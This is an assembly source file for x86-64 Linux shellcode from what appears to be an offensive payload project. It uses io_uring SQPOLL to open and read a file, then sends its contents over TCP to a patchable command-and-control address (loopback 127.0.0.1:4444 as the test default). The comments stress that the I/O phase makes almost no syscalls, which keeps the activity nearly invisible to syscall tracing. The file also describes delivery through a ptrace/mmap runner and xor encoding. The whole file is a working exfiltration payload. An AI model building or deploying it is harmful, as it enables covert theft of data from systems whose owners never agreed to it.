; ================================================================
; sqpoll_min.asm — ROADMAP #1: SQPOLL zero-syscall combined shellcode
; ================================================================
; IORING_SETUP_SQPOLL with entries=1: after io_uring_setup + 2× mmap, a
; kernel thread polls the SQ ring in shared memory — submission is pure
; ring writes (sq_array + sq_tail) and results are awaited by spinning on
; the CQ ring. **Zero io_uring_enter() calls in the I/O phase.**
;
; Mission: minimal exfil — openat → read (≤3840) → socket → connect →
; send. Hand-rolled (no dispatcher, no chunk loop, no close teardown) to
; fit the ≤500-byte budget. Sequential ops, one entry in flight →
; entries=1: the SQ mask is structurally 0 (the operating SQE is always
; index 0), but the kernel forces cq_entries=2 → cq mask is 1, so CQEs
; alternate slots 0/1 and the waiter selects by (head & mask). Most ring
; pointers still live in registers instead of frame slots.
;
; SUBMISSION PROTOCOL (externally validated, /tmp/poc/sqpoll_spin.c harness):
; the SQPOLL thread PARKS at ring creation and sets IORING_SQ_NEED_WAKEUP —
; memory-only submission on a fresh ring is never processed. The mission
; therefore issues exactly ONE conditional wake per ring lifetime
; (enter(fd, 0, 0, IORING_ENTER_SQ_WAKEUP) when the flag is raised —
; fired from _wait_cqe's spin, after the SQE is committed, so the
; thread never consumes an unfilled SQE); with the thread up,
; sq_thread_idle keeps it spinning for the whole mission and every other
; submit/wait completes purely in shared memory. Steady I/O phase: zero
; enter syscalls; strace shows only setup + 2× mmap + 1 wake.
;
; Requires kernel ≥ 5.11 (SQPOLL without CAP_SYS_NICE: io_uring_setup
; returns -EACCES → exit(1) via _fail) and a single combined ring mapping
; (IORING_FEAT_SINGLE_MMAP — universal on ≥5.11): with one mapping, cq_off
; fields are offsets into the SAME base as the SQ ring (no
; +IORING_OFF_CQ_RING addition). C twin: poc/sqpoll_uring.c.
;
; Build (shellcode/Makefile):
;   nasm -f bin -o combined/sqpoll_min.bin combined/sqpoll_min.asm
;   python3 combined/extract.py combined/sqpoll_min.bin --no-array
; Data nulls (path terminator, 127.0.0.1 octets) stay — delivery via
; testing/runner (ptrace/mmap). For null-terminated contexts use a builder
; mission through --encode xor. Config patching (runner sentinel scan /
; extract.py / patch_config.py) refers to the raw payload, before any
; encoding:
;   _config_sa (16-byte sockaddr_in at the data tail): sin_port @+2
;   (2 bytes, big-endian) and sin_addr @+4 (4 bytes, network byte order);
;   the scanners match the family+port+addr byte run, so port = ip − 2
; ================================================================

BITS 64

SYS_URING_STP  equ 425
SYS_URING_ENT  equ 426
SYS_MMAP       equ 9
SQ_WAKEUP      equ 2                 ; IORING_ENTER_SQ_WAKEUP (1 << 1)
NEED_WAKEUP    equ 1                 ; IORING_SQ_NEED_WAKEUP (1 << 0)

; ---- io_uring_params offsets (verified vs /usr/include/linux/io_uring.h;
;      resv[3] puts sq_off @40, and cq_off @80) ----
P_SQ_ENT       equ 0
P_FLAGS        equ 8
P_SQTIDLE      equ 16
P_SQ_TAIL      equ 44                ; params.sq_off.tail
P_CQ_HEAD      equ 80                ; params.cq_off.head
P_CQ_TAIL      equ 84
P_CQ_CQES      equ 100

; ---- SQE/CQE fields ----
SQ_OPCODE      equ 0
SQ_FD          equ 4
SQ_OFF         equ 8                 ; addr2 for connect (addrlen)
SQ_ADDR        equ 16
SQ_LEN         equ 24
CQE_RES        equ 8

OP_OPENAT      equ 18
OP_CONNECT     equ 16
OP_READ        equ 22
OP_SEND        equ 26
OP_SOCKET      equ 45
SQPOLL         equ 2                 ; IORING_SETUP_SQPOLL (kernel header: 1 << 1)

; ---- frame (r13): params = 0..119 (disp8-encodable); slots inside
;      consumed params regions reused when safe (all uses begin after
;      their source params bytes are read) ----
S_SQTP         equ 48                ; sq tail cell mirror — 8-byte write
                                     ; overwrites sq_off.ring_mask/ring_
                                     ; entries (unused: SQ mask is
                                     ; structurally 0 with entries=1)
S_URFD         equ 56                ; io_uring fd — outside the S_SQTP
                                     ; write; overwrites sq_off.flags
                                     ; (never re-read after setup)
S_NBYTES       equ 104               ; read bytes — overwrites cq_off.flags
F_TOTAL        equ 128               ; imm8 encodable (sub rsp, 0x80)

; ---- registers ----
; rbx = data delta   r13 = frame   r14 = read buf   r10 = SQ tail ptr
; r9  = CQ head ptr  rbp = CQ tail ptr    rsi = SQEs base  r12 = cqes base
; r15d = file fd, then sock fd (sequential reuse); the uring fd — needed
; by the wake at ANY op's wait — lives in the slot instead
; rax/rcx/rdx/rdi — scratch (r8 = op4 sockaddr ptr, set fresh each op4)
;
; The SQEs mapping is 64 bytes (entries=1); kernel maps a full page, so
; the read buffer rides the slack at sqes+64 (len ≤ 3840 stays inside
; the mapped page).
RBUF_OFF       equ 64
READ_LEN       equ 0xF00             ; 3840 — push0xF/shl-encodable

; ================================================================
_start:
    sub rsp, F_TOTAL
    mov r13, rsp

_main:
    call _delta
_delta:
    pop rbx

    ; zero params (0..119) + sockaddr area top (120..127)
    mov rdi, r13
    xor eax, eax
    push 16
    pop rcx
    rep stosq

    ; params.flags = IORING_SETUP_SQPOLL; sq_thread_idle = 2000 ms
    mov byte  [r13 + P_FLAGS],   SQPOLL
    mov word  [r13 + P_SQTIDLE], 2000  ; ms — covers the mission span

    ; io_uring_setup(1, params)
    mov ax, SYS_URING_STP
    push 1
    pop rdi
    mov rsi, r13
    syscall
    test rax, rax
    js _fail
    mov [r13 + S_URFD], eax          ; uring fd — needed by the wake enter
                                     ; until well after op1, so it lives in
                                     ; a slot, not in a repurposed register

    ; r10 = MAP_SHARED|MAP_POPULATE = 0x8001 (reused by both mmaps)
    mov r10d, 0x8001

    ; mmap the combined rings (SINGLE_MMAP): one full page — the kernel
    ; validates io_uring mmap offsets, not len > ring (6.14, harness)
    push 0x10
    pop rsi
    shl esi, 8                       ; 4096 — one page
    push 0x3
    pop rdx
    mov r8d, [r13 + S_URFD]
    xor r9, r9                       ; file offset 0
    push 0x9
    pop rax
    xor rdi, rdi
    syscall
    test rax, rax
    js _fail
    mov r14, rax                     ; ring base

    ; mmap SQEs (64 bytes) at IORING_OFF_SQES = 0x10000000
    push 0x40
    pop rsi
    push 0x3
    pop rdx
    mov r8d, [r13 + S_URFD]
    mov r9d, 0x10000000              ; imm32 (nulls tolerated, repo policy)
    push 0x9
    pop rax
    syscall
    test rax, rax
    js _fail
    mov rsi, rax                     ; rsi = SQEs base

    ; ---- ring pointers (all offsets ring-relative into r14; the SQ
    ;      array needs no seeding — the kernel mallocs it to identity
    ;      at setup, verified with the 6.14 harness) ----
    mov eax, [r13 + P_SQ_TAIL]
    add rax, r14
    mov r10, rax                     ; r10 = SQ tail cell (in working mem)
    mov [r13 + S_SQTP], rax          ; mirror: the wake syscall burns r10
    mov eax, [r13 + P_CQ_HEAD]
    add rax, r14
    mov r9, rax                      ; r9 = CQ head cell
    mov eax, [r13 + P_CQ_TAIL]
    add rax, r14
    mov rbp, rax                     ; rbp = CQ tail cell
    mov eax, [r13 + P_CQ_CQES]
    add rax, r14
    mov r12, rax                     ; r12 = cqes base
    lea r14, [rsi + RBUF_OFF]        ; rings done → r14 = read buffer

    ; ================================================================
    ; MISSION: openat → read → socket → connect → send (all SQPOLL)
    ; ================================================================

    ; ---- op 1: openat(path) → file fd ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_OPENAT
    push -100
    pop rcx                          ; AT_FDCWD, sign-extended imm8
    mov [rax + SQ_FD], ecx
    lea rcx, [rbx + _path - _delta]
    mov [rax + SQ_ADDR], rcx
    inc dword [r10]                          ; commit: sq_tail++
    call _wait_cqe_ok                        ; res = fd (may wake once)
    mov r15d, ecx                    ; r15d = file fd (seq reuse: op3/5 overlap)

    ; ---- op 2: read(file_fd, buf, READ_LEN) → nbytes ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_READ
    mov [rax + SQ_FD], r15d
    mov [rax + SQ_ADDR], r14
    mov dword [rax + SQ_LEN], READ_LEN   ; 3840 (imm32 ×2 nulls tolerated)
    inc dword [r10]                          ; commit
    call _wait_cqe_ok                        ; res ≤ 0 filtered in helper
    mov [r13 + S_NBYTES], ecx

    ; ---- op 3: socket(AF_INET, SOCK_STREAM) → sock fd ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SOCKET
    push 2
    pop rdx
    mov [rax + SQ_FD], edx                   ; AF_INET (null-free)
    push 1
    pop rcx
    mov [rax + SQ_OFF], rcx                  ; SOCK_STREAM; protocol=0 (zeroed)
    inc dword [r10]                          ; commit
    call _wait_cqe_ok
    mov r15d, ecx                    ; r15d = sock fd (replaces file fd)

    ; ---- op 4: connect(sock_fd, sockaddr_in(c2)) ----
    ; The sockaddr_in lives verbatim in the data tail (_config_sa) — the
    ; SQE address points into the blob; no frame build, no copies.
    lea r8, [rbx + _config_sa - _delta]
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_CONNECT
    mov [rax + SQ_FD], r15d
    mov [rax + SQ_ADDR], r8
    push 0x10
    pop rcx
    mov [rax + SQ_OFF], rcx                  ; addr2 = sizeof(sockaddr_in)
    inc dword [r10]                          ; commit
    call _wait_cqe_ok

    ; ---- op 5: send(sock_fd, buf, nbytes) ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SEND
    mov [rax + SQ_FD], r15d
    mov [rax + SQ_ADDR], r14
    mov ecx, [r13 + S_NBYTES]
    mov [rax + SQ_LEN], ecx
    inc dword [r10]                          ; commit
    call _wait_cqe_ok

    ; Mission complete. The helpers below sit between the last op and
    ; _exit_ok: falling through would land in _get_sqe, whose ret pops
    ; the kernel-written params u64 at [r13] as a return address (SIGSEGV
    ; at 0x0000000200000001 with entries=1/cq=2 — observed on 6.14).
    jmp _exit_ok

; ----------------------------------------------------------------
; _get_sqe — zero the (single) SQE slot, rax = SQE ptr.
; entries=1 → slot index is structurally 0; the SQ array is kernel-prepared
; as identity (verified: no user seeding needed).
; The SQE stays "uncommitted" until the caller bumps the
; SQ tail AFTER filling it + the wake lives in _wait_cqe's spin.
; Clobbers: rax→SQE ptr, rdi, rcx
; ----------------------------------------------------------------
_get_sqe:
    push rsi                         ; rsi IS the SQE slot 0 pointer
    mov rdi, rsi
    xor eax, eax
    push 8
    pop rcx
    rep stosq                        ; clear 64 bytes
    pop rax                          ; rax = SQE ptr
    ret

; ----------------------------------------------------------------
; _wait_cqe — spin on the CQ ring (normally NO syscall), consume
; CQE 0, res → ecx. WAKE inside the spin: while the ring is empty and
; the SQPOLL thread has parked (IORING_SQ_NEED_WAKEUP at sq tail cell
; +32 — frozen ring ABI), issue enter(fd, 0, 0, SQ_WAKEUP) and keep
; spinning. This is the mission's ONLY enter: it fires once at op 1
; (the thread always parks at ring creation — /tmp/poc/sqpoll_spin.c
; harness) and self-clears; ops 2..5 wait purely in shared memory.
; NOTE: the syscall lands its r10 arg on the ENTER flags, so the SQ
; tail pointer is mirrored at [r13 + S_SQTP] and restored each wake.
; Clobbers: r8, rcx (and rax/rdi/rdx on the wake path only; rsi/r10/rbp
; are preserved — rsi by save/restore, r10 via the S_SQTP mirror)
; ----------------------------------------------------------------
_wait_cqe:
.spin:
    mov r8d, [r9]                    ; cq head (empty when == cq tail)
    cmp r8d, [rbp]                   ; cq tail is kernel-owned
    jne .got
    test byte [r10 + 32], NEED_WAKEUP
    jz .spin
    push rsi                         ; syscall clobbers rsi? no — but our own
                                     ; wake args would, and SQEs base must
                                     ; survive for the next _get_sqe call
    mov edi, [r13 + S_URFD]
    xor esi, esi
    xor edx, edx
    push SQ_WAKEUP
    pop r10                          ; ENTER_* flags land in r10
    xor eax, eax                     ; syscall reads the FULL rax: clear the
    mov ax, SYS_URING_ENT            ; stale bits before loading the nr
    xor r8d, r8d                     ; sig = NULL (mandatory, else -EINVAL)
    syscall
    mov r10, [r13 + S_SQTP]          ; restore the SQ tail pointer
    pop rsi
    jmp .spin
.got:
    and r8d, 1                       ; CQE slot = (head & mask): the kernel
    shl r8d, 4                       ; forces cq_entries=2 (mask=1) with
                                     ; sq_entries=1, so CQEs alternate
                                     ; slots 0/1 — ×16 = sizeof(cqe)
    mov ecx, [r12 + r8 + CQE_RES]    ; cqe[(head&1)].res — stale SIB note:
                                     ; r8 is a full 64-bit index here (r8d
                                     ; ops zero-extend, so r8 ∈ {0,16})
    inc dword [r9]                   ; consume (user-owned cq head)
    ret

_wait_cqe_ok:
    call _wait_cqe
    test ecx, ecx
    js _fail
    ret

_exit_ok:
    xor edi, edi                     ; op5 success falls through here: exit(0)
_exit:
    mov edi, [r13 + S_URFD]          ; close(io_uring fd): signal the SQPOLL
    push 0x3                         ; thread's teardown — without it the
    pop rax                          ; group exit can stall on the ring's
    syscall                          ; borrowed-mm kthread bookkeeping
    xor edi, edi                     ; exit status 0 (or 1 if _fail set it)
    push 0xE8
    pop rax                          ; exit_group — NOT sys_exit(0x3C): the
                                     ; SQPOLL ring's io_wq workers share
                                     ; this thread group and never run
                                     ; again, so a per-thread exit never
                                     ; completes the group teardown
    syscall
_fail:                               ; -EACCES on setup: SQPOLL unpriv < 5.11
    push 0x01
    pop rdi
    jmp _exit

; ================================================================
; Config/data — AT THE END (sentinel-compat: runner scan + extract.py)
; ================================================================
_path:
    db '/etc/hostname', 0            ; NULLBYTE (terminator — data)

; ---- op 4 source sockaddr_in — 127.0.0.1 (loopback for testing) ----
; Layout = struct sockaddr_in: family @+0 (host order), port @+2, addr
; @+4, sin_zero @+8. Contract (runner scan + extract.py): the sentinel
; is the family+port+addr byte run — port at IP −2, IP at sa+4.
_config_sa:
    db 0x02, 0x00                    ; sin_family = AF_INET
    db 0x11, 0x5c                    ; sin_port = 4444 (big-endian, patched)
    db 127, 0, 0, 1                  ; sin_addr (patched; 0x00 octets = data)
    times 8 db 0                     ; sin_zero (padding — data nulls)
